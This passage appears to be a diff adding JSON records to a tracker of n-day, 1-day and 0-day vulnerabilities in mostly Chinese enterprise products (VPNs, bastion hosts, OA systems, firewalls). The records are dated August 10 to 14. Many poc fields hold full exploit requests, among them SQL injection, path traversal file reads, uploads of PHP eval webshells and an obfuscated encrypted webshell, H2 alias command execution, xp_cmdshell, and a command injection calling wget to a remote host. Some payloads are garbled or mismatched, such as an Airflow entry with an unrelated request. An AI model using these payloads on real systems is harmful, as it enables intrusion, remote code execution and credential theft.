+  "poc": "GET http://target.com/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1 Host: target.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflateConnection: close",
+  "label": "nday"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟ads RCE",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/postrev.php 请求体： filename=",
+  "date": "08.14",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟sas堡垒机GetFile任意文件读取",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/loc Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close",
+  "label": "nday"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟下一代防火墙upload",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "/api/v1/device/bugsInfo 绿盟SSLVPN存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行 出现漏洞的端口为8081",
+  "date": "08.14",
+  "poc": "POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9 Host: --1d52ba2a11ad8a915eddab1a0e85acd9 Content-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\" lang|s:52:\"../../../../../../../../../../../../../../../../tmp/\"; --1d52ba2a11ad8a915eddab1a0e85acd9-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" <?php eval($_POST['cmd']);?> --4803b59d015026999b45993b1245f0ef-- POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" <?php eval($_POST['cmd']);?> --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo();",
+  "label": "nday"
+ },
+ {
+  "vendor": "网御星云",
+  "name": "网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "/bottomframe.cgi?user_name=",
+  "date": "08.14",
+  "poc": "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远M3反序列化漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "某司被打，但payload不太一样 /mobile_portal/api/pns/message/send/batch/6_1sp1 /mobile_portal/api/systemLog/pns/loadLog/app.log",
+  "date": "08.14",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "迪普",
+  "name": "迪普rce 疑似0day",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/func/web_main/webservice/system/system Authorization: basic:YWRtaW46YWRtaW5fZGVmYXVsdA== xml注入，filename处执行命令",
+  "date": "08.14",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "金山",
+  "name": "金山终端安全系统V9任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "POST /inter/software_relation.php HTTP/1.1 Host: 192.168.249.137:6868 Content-Length: 1557 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 Origin: http://192.168.249.137:6868 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolFileName\" ../../datav.php ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolDescri\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"id\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"version\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"sofe_typeof\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"fileSize\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"param\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolName\" ------WebKitFormBoundaryxRP5VjBKdqBrCixM Content-Disposition: form-data; name=\"toolImage\"; filename=\"3.php\" Content-Type: image/png <?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?> ------WebKitFormBoundaryxRP5VjBKdqBrCixM",
+  "label": "nday"
+ },
+ {
+  "vendor": "金盘",
+  "name": "金盘 微信管理平台 getsysteminfo 未授权访问漏洞",
+  "type": "未授权访问",
+  "source": "公众号",
+  "info": "/admin/weichatcfg/getsysteminfo",
+  "date": "08.14",
+  "poc": "/admin/weichatcfg/getsysteminfo",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞",
+  "type": "信息泄露",
+  "source": "TG",
+  "info": "",
+  "date": "08.14",
+  "poc": "GET /EXCU_SHELL HTTP/1.1Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15 Cmdnum: 1 Command1: show running-config Confirm1: n Accept-Encoding: gzip",
+  "label": "nday"
+ },
+ {
+  "vendor": "飞企互联",
+  "name": "飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "飞企互联 FE业务协作平台 ShowImageServlet接口存在各种文件读取漏洞，攻击者通过漏洞可以获取服务器中 网络测绘 “flyrise.stopBackspace.js”",
+  "date": "08.14",
+  "poc": "/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print",
+  "label": "nday"
+ },
+ {
+  "vendor": "DzzOffice",
+  "name": "DzzOffice最新版RCE(21年的洞，不知道哪的垃圾当0day了)",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/core/api/wopi/index.php?access_token=1&action=contents&path=",
+  "date": "08.11",
+  "poc": "POST /core/api/wopi/index.php?access_token=1&action=contents&path=ZmM0OWp3bDgxbDE3WlhocFlCVUl4ZDFvRkNYeDRVaGtQbklJYlVSUjV2VjRzLzBwUkJ0Y051ZHl4QzVITFlvN205cENqZktDY1lyNHRQQ0pWblU= HTTP/1.1 Host: test.com Content-Length: 18 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://word.com Referer: http://word.com/user.php?mod=login Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <?php phpinfo();?>",
+  "label": "nday"
+ },
+ {
+  "vendor": "nginx",
+  "name": "nginxWebUI 远程命令执行漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/AdminPage/conf/runCmd?cmd= /AdminPage/remote/cmdOver /Api/nginx/runNginxCmd /AdminPage/conf/reload?nginxExe= 请求体中可能存在： %26%26nginx&interval=1 remoteId=",
+  "date": "08.11",
+  "poc": "https://xxx.com/AdminPage/conf/runCmd?cmd=calc%26%26nginx POST /AdminPage/remote/cmdOver HTTP/1.1 Host: 127.0.0.1:8080 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Origin: http://127.0.0.1:8080 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://127.0.0.1:8080/adminPage/remote Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 51 remoteId=local&cmd=start calc%26%26nginx&interval=1 POST /Api/nginx/runNginxCmd HTTP/1.1 Host: 127.0.0.1:8080 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Origin: http://127.0.0.1:8080 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://127.0.0.1:8080/adminPage/remote Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 19 cmd=calc%26%26nginx https://xxx.com/AdminPage/conf/reload?nginxExe=calc%20%7C",
+  "label": "0day"
+ },
+ {
+  "vendor": "傲盾",
+  "name": "傲盾信息安全管理系统前台远程命令执行漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/user_management/sichuan_login 请求体： loginname=sysadmin&ticket=",
+  "date": "08.11",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "启明",
+  "name": "启明4A getMaster信息泄露",
+  "type": "信息泄露",
+  "source": "TG",
+  "info": "/accountAzpi/getMaster.do 响应包存在以下字段： name password",
+  "date": "08.11",
+  "poc": "/accountApi/getMaster.do",
+  "label": "1day"
+ },
+ {
+  "vendor": "启明",
+  "name": "启明天玥SQL注入",
+  "type": "SQL注入",
+  "source": "社群",
+  "info": "/ops/index.php?c=Reportguide&a=checkrn",
+  "date": "08.11",
+  "poc": "POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1 Host xxx User-Agent: Mozilla/5.0(Macintosh;Intel Mac OS X 10.15;rv:88.0) Gecko/20100101 Firefox/88.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3en;q=0.2 Accept-Encoding: gzip,deflate Upgrade-Insecure-Requests: 1 Connection: close Content-Type: application/x-www-from-urlencoded Content-Length: 23 checkname=123&tagid=123",
+  "label": "0day"
+ },
+ {
+  "vendor": "大华",
+  "name": "大华dss 任意文件下载和rce",
+  "type": "RCE",
+  "source": "TG",
+  "info": "/portal/login_init.action /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:// content-type字段： /bin/bash cmd.exe",
+  "date": "08.11",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "大华",
+  "name": "大华智慧园区任意密码读取攻击",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "/admin/user_getUserInfoByUserName.action?userName=system",
+  "date": "08.11",
+  "poc": "/admin/user_getUserInfoByUserName.action?userName=system",
+  "label": "1day"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒明御网关RCE",
+  "type": "RCE",
+  "source": "微信",
+  "info": "/sslvpn/sslvpn_client.php?client=logoImg&img=",
+  "date": "08.11",
+  "poc": "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20-a%20/usr/local/webui/sslvpn/file.txt|ls",
+  "label": "1day"
+ },
+ {
+  "vendor": "思迈特",
+  "name": "Smartbi 未授权访问及 JDBC 任意代码执行漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "Smartbi <= V10 getPassword接口",
+  "date": "08.11",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 e-Mobile Download.jsp RCE",
+  "type": "RCE",
+  "source": "TG",
+  "info": "/mobile/plugin/Download.jsp?sessionkey=",
+  "date": "08.11",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA E-Office OfficeServer.php 任意文件上传",
+  "type": "任意文件上传",
+  "source": "微信群",
+  "info": "/eoffice10/server/public/iWebOffice2015/Document/",
+  "date": "08.11",
+  "poc": "POST/ weaver/weaver. file.FileDownloadForOutDoc HTTP/1.1 Host: xxxxxxxx Content -Length: 73 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; ×64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Content -Type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* Origin: Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN, zh;q-0.9 Connection: close isFromOutImg=1&fileid=3+AND+(SELECT+6523+FROM+ (SELECT(SLEEP (5900)))ukYE)#",
+  "label": "1day"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS综合安防系统springbootenv+dump用户名密码",
+  "type": "信息泄露",
+  "source": "TG",
+  "info": "/artemis-portal/artemis/env /artemis-portal/artemis/heapdump",
+  "date": "08.11",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友-时空KSOA QueryService sql注入漏洞",
+  "type": "SQL注入",
+  "source": "微信群",
+  "info": "/servlet/com.sksoft.bill.QueryService?service=query&content= 注入点在content",
+  "date": "08.11",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友-时空KSOA TaskRequestServlet sql注入漏洞",
+  "type": "SQL注入",
+  "source": "微信群",
+  "info": "/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid= 注入点在unitid",
+  "date": "08.11",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友NC uploadControl/uploadFile 任意文件上传",
+  "type": "任意文件上传",
+  "source": "微信群",
+  "info": "/mp/loginxietong?username= /mp/uploadControl/uploadFile /mp/uploadFileDir/",
+  "date": "08.11",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友移动管理系统uploadApk.do任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.11",
+  "poc": "POST /maportal/appmanager/uploadApk.do?pk obj= HTTP/1.1Host: Content-Type: multipart/form-data;boundarv=----WebKitFormBoundarvyLTG6zX0aZ8LZ03User-Aaent: Mozilla/50 (Macintosh: Inte Mac OS X10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;g=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.serverConnection: cose -----WebKitFormBoundaryvLTG6zlX0gZ8LZ03Content-Disposition: form-data; name=\"downloadpath\"，filename=\"ajsp\"Content-Type: application/msword hello------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- 访问路径/maupload/apk/ajsp",
+  "label": "0day"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟sas堡垒机exec远程命令执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "/webconf/Exec/index",
+  "date": "08.11",
+  "poc": "GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close",
+  "label": "1day"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟sas堡垒机local_user.php任意用户登录漏洞",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "/api/virtual/home/status?cat=",
+  "date": "08.11",
+  "poc": "GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/loc Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12. Accept-Encoding: gzip, deflate Connection: close",
+  "label": "1day"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远 OA 后台存在远程代码执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "/seeyon/constDef.do",
+  "date": "08.11",
+  "poc": "authorization=&login_username=seeyonsystemadmin&login_password=seeyon123456 /seeyon/constDef.do?method=newConstDef&constKey=1te2111s2t&constDefine=%24%64%65%6d%6f%20%22%3b%6e%65%77%20%46%69%6c%65%28%22%2e%2e%2f%77%65%62%61%70%70%73%2f%73%65%65%79%6f%6e%2f%65%72%72%6f%72%31%2e%6a%73%70%78%22%29%2e%77%72%69%74%65%28%55%52%4c%44%65%63%6f%64%65%72%2e%64%65%63%6f%64%65%28%22%25%32%34%22%2c%20%22%55%54%46%2d%38%22%29%5c%75%30%30%32%62%22%7b%27%27%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%70%61%72%61%6d%2e%61%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2e%67%65%74%45%6e%67%69%6e%65%42%79%4e%61%6d%65%28%27%6a%73%27%29%2e%65%76%61%6c%28%70%61%72%61%6d%2e%62%29%7d%22%29%3b%22&constDescription=&constType=4 如果打成功，返回结果是 {\"error\":\"ok\"}",
+  "label": "0day"
+ },
+ {
+  "vendor": "蓝凌",
+  "name": "蓝凌eis 8.0前台任意文件上传",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "/eis/service/api.aspx?action=saveImg",
+  "date": "08.11",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "金和",
+  "name": "金和OA C6-GetSqlData.aspx SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "DVB、TG",
+  "info": "",
+  "date": "08.11",
+  "poc": "POST /C6/Control/GetSqlData.aspx/.ashx Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip exec master..xp_cmdshell 'ipconfig'",
+  "label": "nday"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶K3ERP系统 CusShareService SQL注入",
+  "type": "SQL注入",
+  "source": "微信群",
+  "info": "/K3WEB/CRM/WEBSERVICE/CusShareService.asmx",
+  "date": "08.11",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "飞鱼星",
+  "name": "飞鱼星企业级智能无线上网行为管理系统 存在未授权访问用户组漏洞",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "/home/advanced/new_user.html?id=",
+  "date": "08.11",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "Apache",
+  "name": "Apache Airflow 存在权限绕过漏洞",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "Apache Airflow 2.6.0 之前版本",
+  "date": "08.10",
+  "poc": "POST /list_mac_address.php HTTP/1.1 Host: Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 72 macaddr=00:00:44:00:00:00;echo 'pwn'>/var/www/pwn.txt&action=0&settype=1",
+  "label": "1day"
+ },
+ {
+  "vendor": "coremail",
+  "name": "Coremail邮件系统未授权访问获取管理员账密",
+  "type": "认证绕过",
+  "source": "社区",
+  "info": "据说攻击队利用此0day已打穿上海某单位 不保真",
+  "date": "08.10",
+  "poc": "/coremail/common/assets/;/;/;/;/;/;/s?__biz=MzI3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2",
+  "label": "1day"
+ },
+ {
+  "vendor": "exchange",
+  "name": "Exchange Server远程代码执行漏洞",
+  "type": "RCE",
+  "source": "csdn",
+  "info": "CVE-2023-38182 Exchange Server 2019 Cumulative Update 13 Exchange Server 2019 Cumulative Update 12 Exchange Server 2019 Cumulative Update 11 Exchange Server 2016 Cumulative Update 23 需要有普通用户权限",
+  "date": "08.10",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "nginx",
+  "name": "nginx目录穿越任意文件读取",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "version<=1.25.0 1.25.1不存在",
+  "date": "08.10",
+  "poc": "我造的假视频",
+  "label": "0day"
+ },
+ {
+  "vendor": "大为",
+  "name": "大为lnnojet知识产权协同创新管理系统0day",
+  "type": "认证绕过",
+  "source": "微信",
+  "info": "/resetPwd.html?guid=/",
+  "date": "08.10",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞",
+  "type": "认证绕过",
+  "source": "公众号",
+  "info": "",
+  "date": "08.10",
+  "poc": "POST /changepass.php?type=2 Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={\"this_name\":\"test\",\"subAuthId\":\"1\"} old_pass=&password=Test123!@&repassword=Test123!@",
+  "label": "nday"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒EDR 0day",
+  "type": "未知",
+  "source": "微信",
+  "info": "未知",
+  "date": "08.10",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒明御WAF report.php任意用户登录",
+  "type": "认证绕过",
+  "source": "社群",
+  "info": "21年的老洞，4.6.34以上已修复，建议升级到4.6.51及以上版本",
+  "date": "08.10",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安恒",
+  "name": "安恒蜜罐逃逸",
+  "type": "认证绕过",
+  "source": "社区",
+  "info": "改密泄露",
+  "date": "08.10",
+  "poc": "",
+  "label": "1day"
+ },
+ {
+  "vendor": "宏景",
+  "name": "宏景 eHR OfficeServer.jsp 任意文件上传",
+  "type": "任意文件上传",
+  "source": "公众号、TG",
+  "info": "",
+  "date": "08.10",
+  "poc": "POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1 Host: xx.xx.xx.xx Cookie: JSESSIONID=C92F3ED039AAF958516349D0ADEE426E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Content-Length: 417 DBSTEP V3.0 351 0 666 DBSTEP=REJTVEVQ OPTION=U0FWRUZJTEU= currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 FILETYPE=Li5cMW5kZXguanNw RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 1 shell路径： http://xx.xx.xx.xx/1ndex.jsp",
+  "label": "nday"
+ },
+ {
+  "vendor": "拓尔思",
+  "name": "拓尔思ids 前台反序列化",
+  "type": "反序列化",
+  "source": "社区",
+  "info": "未知",
+  "date": "08.10",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "汉得",
+  "name": "汉得SRM tomcat.jsp 登录绕过漏洞",
+  "type": "认证绕过",
+  "source": "公众号",
+  "info": "",
+  "date": "08.10",
+  "poc": "/tomcat.jsp?dataName=role_id&dataValue=1 /tomcat.jsp?dataName=user_id&dataValue=1 然后访问后台：/main.screen",
+  "label": "1day"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 e-Office ajax.php 任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "公众号",
+  "info": "CVE-2023-2523",
+  "date": "08.10",
+  "poc": "POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 Host:192.168.233.10:8082 Cache-Control:max-age=0 Upgrade-Insecure-Requests:1 Origin:null Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt Accept-Encoding:gzip, deflate Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Connection:close ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition:form-data; name=\"upload_quwan\"; filename=\"1.php.\" Content-Type:image/jpeg <?phpphpinfo();?> ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Mobile6前台SQL注入",
+  "type": "SQL注入",
+  "source": "微信群",
+  "info": "/messageType.do /client.do",
+  "date": "08.10",
+  "poc": "POST /messageType.do HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7 Content-Length: 1142 ------WebKitFormBoundaryTm8YXcJeyKDClbU7 Content-Disposition: form-data; name=\"method\" create ------WebKitFormBoundaryTm8YXcJeyKDClbU7 Content-Disposition: form-data; name=\"typeName\" 1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('whoami');-- ------WebKitFormBoundaryTm8YXcJeyKDClbU7--",
+  "label": "nday"
+ },
+ {
+  "vendor": "深信服",
+  "name": "深信服报表系统登录绕过",
+  "type": "认证绕过",
+  "source": "飞书",
+  "info": "版本有限制 请求体中存在userID= userID中存在%0A内容",
+  "date": "08.10",
+  "poc": "POST /rep/login HTTP/1.1 Host: URL Cookie: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 Accept-Encoding: gzip deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: cross-site Pragma: no-cache Cache-Control: no-cache14 Te: trailers Connection: close Content-Type:application/x-www-form-urlencoded Content-Length: 126 clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq",
+  "label": "1day"
+ },
+ {
+  "vendor": "绿盟",
+  "name": "绿盟sas安全审计系统任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "csdn",
+  "info": "/webconf/GetFile/index",
+  "date": "08.10",
